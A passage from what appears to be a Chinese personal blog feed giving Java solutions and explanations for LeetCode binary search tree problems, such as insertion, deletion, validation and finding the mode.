&#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//缩小 确定范围在左子树</span></span><br><span class="line">        <span class="keyword">if</span>(root.val &gt; p.val &amp;&amp; root.val &gt; q.val) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left,p,q);</span><br><span class="line">            <span class="comment">//注意判空</span></span><br><span class="line">            <span class="keyword">if</span>(left != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">//缩小 确定范围在右子树</span></span><br><span class="line">        <span class="keyword">if</span>(root.val &lt; p.val &amp;&amp; root.val &lt; q.val) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right,p,q);</span><br><span class="line">            <span class="comment">//注意判空</span></span><br><span class="line">            <span class="keyword">if</span>(right != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//p、q一个在左一个在右 那就是root是根节点</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树中的插入操作"><a href="#二叉搜索树中的插入操作" class="headerlink" title="二叉搜索树中的插入操作"></a>二叉搜索树中的插入操作</h4><p>link：<a href="https://leetcode.cn/problems/insert-into-a-binary-search-tree/description/">701. 二叉搜索树中的插入操作 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>根据题目描述遍历比较插入即可，和上题一样可以缩小范围进行判断.<br>题目又说任意地方插入，我们选插入叶子节点，只要遍历当前节点为空就说明扎到了向上返回即可.</p><h6 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">insertIntoBST</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(val);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &lt; root.val) &#123;</span><br><span class="line">            root.left = insertIntoBST(root.left,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &gt; root.val) &#123;</span><br><span class="line">            root.right = insertIntoBST(root.right,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除二叉搜索树中的节点"><a href="#删除二叉搜索树中的节点" class="headerlink" title="删除二叉搜索树中的节点"></a>删除二叉搜索树中的节点</h4><p>link：<a href="https://leetcode.cn/problems/delete-node-in-a-bst/">450. 删除二叉搜索树中的节点 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>首先找到要删除的节点（如果是叶子节点的话删除不影响）只要不是叶子节点删除可以把右子树中的最小节点（即右子树的最左侧节点）或左子树中的最大节点（即左子树的最右侧节点）上移占位.<br>找目标删除的节点也可以用相同的方法缩小判断区间.<br><strong>六种可能性</strong><br>1.没有匹配key的节点<br>2.能找到但匹配值的为叶子节点<br>3.能找到匹配值不为叶子节点但<strong>左子树为空右子树也为空</strong><br>4.能找到匹配值不为叶子节点但<strong>左子树不为空右子树为空</strong><br>5.能找到匹配值不为叶子节点但<strong>左子树为空右子树不为空</strong><br>6.能找到匹配值不为叶子节点但<strong>左子树右子树都不为空</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">deleteNode</span><span class="params">(TreeNode root, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 找到要删除的节点</span></span><br><span class="line">        <span class="keyword">if</span> (root.val == key) &#123;</span><br><span class="line">            <span class="comment">// 情况1: 节点是叶子节点</span></span><br><span class="line">            <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况2: 节点只有左子树</span></span><br><span class="line">            <span class="keyword">if</span> (root.left != <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况3: 节点只有右子树</span></span><br><span class="line">            <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.right;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况4: 节点有两个子树</span></span><br><span class="line">            <span class="keyword">if</span> (root.left != <span class="literal">null</span> &amp;&amp; root.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root.right;</span><br><span class="line">                <span class="keyword">while</span> (cur.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    cur = cur.left;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 将左子树连接到右子树的最小节点</span></span><br><span class="line">                cur.left = root.left;</span><br><span class="line">                <span class="comment">// 返回右子树</span></span><br><span class="line">                <span class="keyword">return</span> root.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 递归调用</span></span><br><span class="line">        <span class="keyword">if</span> (root.val &lt; key) &#123;</span><br><span class="line">            root.right = deleteNode(root.right, key); <span class="comment">// 更新右子树</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            root.left = deleteNode(root.left, key); <span class="comment">// 更新左子树</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> root; <span class="comment">// 返回更新后的根节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">deleteNode</span><span class="params">(TreeNode root, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val == key) &#123;</span><br><span class="line">            <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(root.left != <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.right;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//从左子树选取</span></span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root.left;</span><br><span class="line">                <span class="comment">//遍历找到左子树最右侧的节点</span></span><br><span class="line">                <span class="keyword">while</span>(cur.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    cur = cur.right;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//将要删除节点的右子树连接到最右侧节点</span></span><br><span class="line">                cur.right = root.right;</span><br><span class="line">                <span class="comment">//更新当前节点为左子树的根节点</span></span><br><span class="line">                root = root.left;</span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(root.val &lt; key) &#123;</span><br><span class="line">                root.right = deleteNode(root.right,key);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>( key &lt; root.val) &#123;</span><br><span class="line">                root.left = deleteNode(root.left,key);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong><br>为什么是cur.left &#x3D; root.left;?<br>假设我们有如下结构的树.</p><p><img src="/../imgs/2024-10/image-20241118141018034.png" alt="image-20241118141018034"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root.right; <span class="comment">// cur 现在指向 7</span></span><br><span class="line"><span class="keyword">while</span> (cur.left != <span class="literal">null</span>) &#123;</span><br><span class="line">    cur = cur.left; <span class="comment">// cur 最终指向 null（右子树最小节点）</span></span><br><span class="line">&#125;</span><br><span class="line">cur.left = root.left; <span class="comment">// 将左子树连接到最小节点</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x14</title>
      <link href="/2024/11/14/yub%E3%81%AEAlgorithm.0x14/"/>
      <url>/2024/11/14/yub%E3%81%AEAlgorithm.0x14/</url>
      
        <content type="html"><![CDATA[<h4 id="验证二叉搜索树"><a href="#验证二叉搜索树" class="headerlink" title="验证二叉搜索树"></a>验证二叉搜索树</h4><p>link：<a href="https://leetcode.cn/problems/validate-binary-search-tree/description/">98. 验证二叉搜索树 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>搞清二叉搜索树的定义即可.(根节点的左子树比根节点小，右子树比根节点大且每个子树都满足)<br><img src="/../imgs/2024-10/image-20241114113444728.png" alt="image-20241114113444728"></p><p>但其实上述思路是是不对， 跑一下代码发现测试样例值通过了一部分.那是哪里出问题了？（烧烤）<br>比较的应该是左子树所有节点小于中间节点，右子树所有节点大于中间节点.<br><strong>查资料发现二叉搜索树也可以为空</strong></p><h6 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> validBST(Long.MIN_VALUE, Long.MAX_VALUE, root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">validBST</span><span class="params">(<span class="type">long</span> lower, <span class="type">long</span> upper, TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root.val &lt;= lower || root.val &gt;= upper) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> validBST(lower, root.val, root.left) &amp;&amp; validBST(root.val, upper, root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h6><p>采用pre指针遍历对比记录前一个节点内容，进行中序遍历比较.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">left</span> <span class="operator">=</span> isValidBST(root.left);</span><br><span class="line">        <span class="comment">//确保至少以及遍历过一个节点</span></span><br><span class="line">        <span class="keyword">if</span>(pre != <span class="literal">null</span> &amp;&amp; pre.val &gt;= root.val) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//更新节点</span></span><br><span class="line">        pre = root;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">right</span> <span class="operator">=</span> isValidBST(root.right);</span><br><span class="line">        <span class="keyword">return</span> left &amp;&amp; right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树的最小绝队差"><a href="#二叉搜索树的最小绝队差" class="headerlink" title="二叉搜索树的最小绝队差"></a>二叉搜索树的最小绝队差</h4><p>link：<a href="https://leetcode.cn/problems/minimum-absolute-difference-in-bst/description/">530. 二叉搜索树的最小绝对差 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>和上一题一样，用一个指针记录遍历比较再用一个大数值记录结果即可.【注意取值】</p><h6 id="中序遍历-1"><a href="#中序遍历-1" class="headerlink" title="中序遍历"></a>中序遍历</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMinimumDifference</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//左</span></span><br><span class="line">        getMinimumDifference(root.left);</span><br><span class="line">        <span class="comment">//判断</span></span><br><span class="line">        <span class="keyword">if</span>(pre != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> root.val - pre.val;</span><br><span class="line">            <span class="keyword">if</span>(tmp &lt; result) &#123;</span><br><span class="line">                result = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//更新节点</span></span><br><span class="line">        pre = root;</span><br><span class="line">        <span class="comment">//右</span></span><br><span class="line">        getMinimumDifference(root.right);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树中的众数"><a href="#二叉搜索树中的众数" class="headerlink" title="二叉搜索树中的众数"></a>二叉搜索树中的众数</h4><p>link：<a href="https://leetcode.cn/problems/find-mode-in-binary-search-tree/">501. 二叉搜索树中的众数 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>最直接就是直接遍历搜索，使用Map比较记录.但是这样就失去了搜索二叉树的意义.<br>所以我们还是选择中序遍历的方式，需要定义count（记录当前节点出现的次数）和maxCount（出现次数最多的节点），再定义一个pre作为记录节点方便比较.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//定义需要的参数</span></span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] findMode(TreeNode root) &#123;</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        findMode1(root);</span><br><span class="line">        <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[res.size()];</span><br><span class="line">        <span 